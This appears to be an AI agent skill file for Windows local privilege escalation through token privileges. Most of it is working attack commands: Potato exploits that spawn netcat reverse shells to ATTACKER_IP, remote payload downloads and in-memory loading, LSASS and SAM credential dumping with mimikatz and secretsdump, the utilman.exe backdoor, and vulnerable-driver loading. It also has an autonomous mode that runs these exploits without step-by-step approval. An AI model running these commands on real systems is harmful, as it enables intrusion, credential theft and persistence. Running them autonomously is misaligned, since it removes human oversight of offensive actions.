---
name: windows-token-impersonation
description: >
  Exploit Windows token privileges for local privilege escalation to SYSTEM. Use this
  skill when the user has SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege,
  SeDebugPrivilege, SeBackupPrivilege, or other dangerous token privileges. Also
  triggers on: "potato exploit", "juicypotato", "printspoofer", "godpotato",
  "token impersonation", "SeImpersonate", "SeDebug", "dangerous privileges",
  "service account to system". OPSEC: medium (creates new processes, COM/RPC activity).
  Tools: JuicyPotato, PrintSpoofer, GodPotato, RoguePotato, EfsPotato, SigmaPotato,
  FullPowers, mimikatz, incognito.
  Do NOT use for service/DLL exploitation — use windows-service-dll-abuse instead.
  Do NOT use for kernel exploits — use windows-kernel-exploits instead.
---

# Windows Token Impersonation & Dangerous Privileges

You are helping a penetration tester escalate privileges on a Windows system by
exploiting token privileges. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Check privileges, select optimal Potato variant for OS version,
  execute, verify SYSTEM access. Fall back to alternatives on failure.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones:
  `### [HH:MM] windows-token-impersonation → <hostname>` with privilege found,
  variant used, and result.
- **Findings** → append to `engagement/findings.md` when SYSTEM access achieved.
- **Evidence** → save output to `engagement/evidence/` (e.g.,
  `potato-system-shell.txt`, `whoami-system.txt`).

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[windows-token-impersonation] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] windows-token-impersonation → <target>
   - Invoked (assessment starting)
   ```

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Check which privileges the current user has
- Check OS version (determines Potato variant selection)
- Leverage existing access or credentials

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Access**: Update to SYSTEM shell on hostname
- **Vulns**: Mark privilege abuse as `[done]`
- **Pivot Map**: Note SYSTEM access enables credential dumping, persistence, etc.

## Prerequisites

- Shell access on a Windows system
- At least one exploitable token privilege (check with `whoami /priv`)
- Ability to transfer tools to target (or use tools already present)

## Step 1: Check Privileges

```cmd
whoami /priv
whoami /groups
```

**Look for these privileges (Enabled or Disabled — Disabled can be enabled programmatically):**

| Privilege | Impact | Exploitation |
|-----------|--------|-------------|
| SeImpersonatePrivilege | Impersonate any token with a handle | Potato family |
| SeAssignPrimaryTokenPrivilege | Assign token to new process | Potato family |
| SeDebugPrivilege | Read/write any process memory | Token theft from SYSTEM process |
| SeBackupPrivilege | Read any file bypassing DACL | SAM/SYSTEM hive extraction |
| SeRestorePrivilege | Write any file bypassing DACL | DLL hijack / binary replace |
| SeTakeOwnershipPrivilege | Take ownership of any object | Ownership → DACL → full access |
| SeLoadDriverPrivilege | Load kernel drivers | Load vulnerable driver → SYSTEM |
| SeManageVolumePrivilege | Raw disk access | Read SAM/secrets bypassing NTFS |
| SeCreateTokenPrivilege | Create arbitrary tokens | Forge admin token |

**If running as LOCAL SERVICE / NETWORK SERVICE with stripped privileges:**

Use FullPowers to restore default service account privileges first:

```cmd
FullPowers.exe -c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd" -z
```

FullPowers creates a scheduled task to spawn a process with the full privilege set,
then restores SeImpersonatePrivilege to the current token.

## Step 2: Determine OS Version

The OS version determines which Potato variant works:

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ver
```

```powershell
[System.Environment]::OSVersion.Version
(Get-CimInstance Win32_OperatingSystem).BuildNumber
```

**Also check if Print Spooler is running (needed for PrintSpoofer):**

```cmd
sc query Spooler
```

## Step 3: Potato Variant Selection

Use SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege to get SYSTEM via DCOM
token impersonation. Select variant by Windows version:

### JuicyPotato — Windows 7/8/10 (pre-1809), Server 2008-2016

Abuses DCOM/COM activation with chosen CLSID. Requires a valid CLSID for the target
OS version.

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -t * -c {CLSID}
```

**Parameters:**
- `-l` — COM server listen port
- `-p` — program to launch
- `-a` — arguments to program
- `-t` — `*` (try both), `t` (CreateProcessWithTokenW), `u` (CreateProcessAsUser)
- `-c` — target CLSID (OS-specific, see below)

**Common CLSIDs:**
```
{4991d34b-80a1-4291-83b6-3328366b9097}
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
{e60687f7-01a1-40aa-86ac-db1cbf673334}
{B91D5831-B1BD-4608-8198-D72E155020F7}
```

CLSID lists per OS: https://ohpe.it/juicy-potato/CLSID/

**Testing CLSIDs (if default fails):**
1. Download `GetCLSID.ps1` + `test_clsid.bat`
2. Run `test_clsid.bat` — when port number changes, CLSID worked
3. Use working CLSID with `-c`

### PrintSpoofer — Windows 10/11, Server 2016-2019

Simplest variant. Abuses Print Spooler named pipe to capture SYSTEM token.

```cmd
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
PrintSpoofer.exe -d 3 -c "powershell -ep bypass"
```

**Parameters:**
- `-i` — interactive console
- `-c` — command to execute
- `-d` — desktop session ID (for RDP contexts)

**Requires:** Print Spooler service running. If disabled (post-PrintNightmare
hardening), use GodPotato, RoguePotato, or EfsPotato instead.

### GodPotato — Windows 8-11, Server 2012-2022

DCOM-based impersonation. Broad version support, no external dependencies.

```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET4.exe -cmd "cmd /c C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
GodPotato-NET35.exe -cmd "cmd /c whoami"
```

Choose `.NET4` or `.NET35` binary matching the installed runtime.

**Staging pattern (for webshells with short timeouts):**
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile C:\temp\gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile C:\temp\shell.ps1
C:\temp\gp.exe -cmd "powershell -ep bypass C:\temp\shell.ps1"
```

### RoguePotato — Windows 10 1809+, Server 2019+

Fake OXID resolver for SYSTEM authentication. Requires a controlled machine for
OXID resolution (or local port forwarding).

```cmd
RoguePotato.exe -r ATTACKER_IP -c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -l 9999
```

**Attacker-side redirector (forward port 135 to victim):**
```bash
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```

**Parameters:**
- `-r` — OXID resolver IP (attacker machine)
- `-c` — command to execute
- `-l` — local listener port (9999 typical)

### EfsPotato / SharpEfsPotato — Windows 8-11, Server 2012-2022

Abuses MS-EFSR (Encrypting File System Remote) protocol. Multiple pipe fallbacks.

```cmd
EfsPotato.exe "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
EfsPotato.exe "whoami" efsrpc
SharpEfsPotato.exe -p cmd.exe -a "/c whoami"
```

**Pipe fallback order (if default fails):** lsarpc → efsrpc → samr → lsass → netlogon

### SigmaPotato — Windows 8-11, Server 2012-2022

GodPotato fork with in-memory execution and built-in reverse shell.

```powershell
# In-memory execution (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Built-in reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```

### JuicyPotatoNG — Windows 10 1809+, Server 2019-2022

Modern JuicyPotato with DCOM/OXID improvements.

```cmd
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
```

For Windows 11 / Server 2022 after January 2023 patches:
```cmd
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami" -c {A9819296-E5B3-4E67-8226-5E72CE9E1FB7}
```

### PrintNotifyPotato — Windows 10/11, Server 2012-2022

Targets PrintNotify service instead of Spooler. Works even when Spooler is disabled.

```cmd
PrintNotifyPotato.exe cmd /c "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

### Potato Variant Decision Tree

```
whoami /priv → SeImpersonate or SeAssignPrimaryToken?
├─ Windows <= 10 1803 / Server 2016
│  └─ JuicyPotato (needs CLSID)
├─ Windows 10 1809+ / Server 2019
│  ├─ Print Spooler running? → PrintSpoofer (simplest)
│  ├─ Egress available? → RoguePotato
│  └─ Neither? → GodPotato or EfsPotato
├─ Windows 10/11 / Server 2022
│  ├─ PrintSpoofer (if Spooler running)
│  ├─ GodPotato / SigmaPotato (most reliable)
│  ├─ EfsPotato (pipe fallback)
│  └─ JuicyPotatoNG (specific CLSID post-Jan 2023)
└─ Spooler disabled everywhere?
   └─ GodPotato > EfsPotato > RoguePotato > PrintNotifyPotato
```

## Step 4: Other Dangerous Privilege Exploitation

If Potato-applicable privileges aren't available, exploit other dangerous privileges:

### SeDebugPrivilege → SYSTEM via Token Theft

Duplicate token from a SYSTEM process (lsass.exe, winlogon.exe, services.exe).

**Via psgetsys.ps1:**
```powershell
import-module psgetsys.ps1
[MyProcess]::CreateProcessFromParent((Get-Process lsass).Id, "C:\Windows\System32\cmd.exe")
```

**Via Metasploit incognito:**
```
use incognito
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
```

**SeDebug also enables LSASS dump:**
```cmd
procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
```
Then offline: `mimikatz # sekurlsa::minidump lsass.dmp` → `sekurlsa::logonpasswords`

### SeBackupPrivilege → Read SAM/SYSTEM Hives

```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

Or use `robocopy /b` (requires SeRestorePrivilege too):
```cmd
robocopy /b C:\Windows\System32\config C:\temp SAM SYSTEM
```

Then extract hashes offline:
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### SeRestorePrivilege → Write Any File

Replace a service binary or DLL loaded by a SYSTEM process:

```powershell
# Enable privilege
Enable-SeRestorePrivilege
# Overwrite utilman.exe with cmd.exe for login-screen SYSTEM shell
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
# Lock screen → Win+U → SYSTEM cmd
```

Or write a malicious DLL to a directory in the search path of a SYSTEM service.
Route to **windows-service-dll-abuse** for targets.

### SeTakeOwnershipPrivilege → Own Any Object

```cmd
takeown /f "C:\Windows\System32\config\SAM"
icacls "C:\Windows\System32\config\SAM" /grant %USERNAME%:F
```

Then read the file. Works on registry keys too:

```powershell
$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\TargetService", [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
```

### SeLoadDriverPrivilege → Load Vulnerable Kernel Driver

```cmd
# Write driver config to HKCU (writable without admin)
reg add "HKCU\System\CurrentControlSet\Services\VulnDriver" /v ImagePath /t REG_SZ /d "\??\C:\temp\vuln_driver.sys"
reg add "HKCU\System\CurrentControlSet\Services\VulnDriver" /v Type /t REG_DWORD /d 1
```

Load a driver with known vulnerabilities (e.g., Capcom.sys) to get kernel R/W,
then overwrite SYSTEM process token.

Cross-reference loaded drivers against https://loldrivers.io for known-vulnerable
drivers already on the system.

### SeManageVolumePrivilege → Raw Volume Read

Bypass NTFS ACLs by reading raw disk sectors:

```powershell
$fs = [System.IO.File]::Open("\\.\C:", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
$buf = New-Object byte[] (1MB)
$null = $fs.Read($buf, 0, $buf.Length)
$fs.Close()
[IO.File]::WriteAllBytes("C:\temp\first_mb.bin", $buf)
```

**High-value targets:**
- `C:\Windows\System32\config\SAM` / `SYSTEM` / `SECURITY`
- `C:\Windows\NTDS\ntds.dit` (Domain Controllers)
- Machine crypto keys in `%ProgramData%\Microsoft\Crypto\RSA\MachineKeys\`

Use tools like RawCopy, FTK Imager, or The Sleuth Kit for structured extraction.

## Step 5: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

After achieving SYSTEM:

- **Credential harvesting**: Route to **windows-credential-harvesting** for DPAPI,
  browser creds, vault, cached credentials
- **Domain context**: If domain-joined, route to **credential-dumping** for
  DCSync/NTDS/SAM dumps, or **ad-discovery** for domain enumeration
- **Persistence**: Route to **ad-persistence** or set up local persistence
  (scheduled task, service, registry run key)
- **Lateral movement**: Use harvested credentials with **pass-the-hash** or
  **kerberos-roasting**

When routing, pass along: hostname, SYSTEM access confirmed, OS version, domain
membership, current mode.

Update `engagement/state.md` with SYSTEM access achieved.

## Troubleshooting

### Potato says "authresult 0" but no shell spawns
The CLSID worked but process creation failed. Try `-t *` to test both
CreateProcessWithToken and CreateProcessAsUser. Also verify the command path
is correct (use full paths).

### JuicyPotato fails on Windows 10 1809+
Expected — Microsoft hardened DCOM activation. Use PrintSpoofer, GodPotato,
RoguePotato, or EfsPotato instead.

### PrintSpoofer fails — "Cannot find Spooler"
Print Spooler service is disabled (common post-PrintNightmare hardening).
Use GodPotato, EfsPotato, or PrintNotifyPotato (targets PrintNotify service
which is often still present).

### EfsPotato fails on default pipe
Try alternate pipes: `EfsPotato.exe "whoami" efsrpc` → `samr` → `lsass` → `netlogon`

### Token privilege shows "Disabled"
Disabled privileges can be enabled programmatically. Most Potato variants and
tools handle this automatically. If not, use `EnableAllTokenPrivs.ps1` or
adjust token in code.

### FullPowers fails — not a service account
FullPowers only works for LOCAL SERVICE and NETWORK SERVICE accounts. For other
accounts, the privileges shown by `whoami /priv` are the actual privileges available.

### SeDebug but LSASS is PPL-protected
LSASS runs as Protected Process Light (RunAsPPL=1). Options:
1. Use vulnerable driver to disable PPL (SeLoadDriverPrivilege or BYOVD)
2. Target other SYSTEM processes (winlogon.exe, services.exe)
3. Use `mimikatz !processprotect /process:lsass.exe /remove` with mimidrv.sys
